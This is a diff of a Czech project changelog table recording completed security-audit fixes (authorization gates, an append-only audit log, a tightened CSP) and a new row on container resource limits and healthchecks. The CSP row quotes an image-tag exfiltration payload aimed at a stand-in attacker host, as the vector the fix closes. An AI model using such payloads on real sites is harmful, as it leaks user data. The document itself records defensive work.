@@ -47,6 +47,7 @@
 | — | Security Audit — Sprint 6 — PR5 (H1+H2) | **DONE** | Wiki/Comment/Attachment write autorizace — všech 7 write endpointů (WikiPage CRUD, EpicWikiPage CRUD, WikiAttachment store/storeImage, Task/Epic/Project/Wiki comment store) přepnuto z `Gate::authorize('view')` na `'contribute'`. Viewer už nemůže mazat/editovat/uploadovat. 9 regresních testů (Viewer deny, Contributor allow). |
 | — | Security Audit — Sprint 6 — PR6 (H3) | **DONE** | Append-only `audit_entries` na DB úrovni — Postgres RULE `ON UPDATE/DELETE DO INSTEAD NOTHING`. Ani admin s psql přístupem, ani budoucí cascade delete, ani kompromitovaný service account nemůže audit stopu přepsat/smazat. 3 pgsql-only testy. |
 | — | Security Audit — Sprint 6 — PR7 (H7) | **DONE** | CSP `img-src` zúžen — `https:` (všechno) nahrazeno `https://*.googleusercontent.com` (jen Google avatary). Exfiltration path přes `<img src=attacker/?c=...>` uzavřena. Změna v `Caddyfile.prod` + `Caddyfile.shared` (prod + staging). Oba validované přes `caddy validate`. |
+| — | DevOps Sprint — PR1 (Resource limits + healthchecks) | **DONE** | `mem_limit` + `cpus` na prod (součet 5.5G), staging (1.4G), Caddy (256M) kontejnery — 8 GB VPS s 500 MB OS headroom. Healthcheck pro worker (`horizon:status`), scheduler (heartbeat touch/find), Caddy (`nc -z :80`). Jedna runaway query už nesrazí Postgres, zamrzlý Horizon/scheduler Docker restartne automaticky. |
 
 ---
 
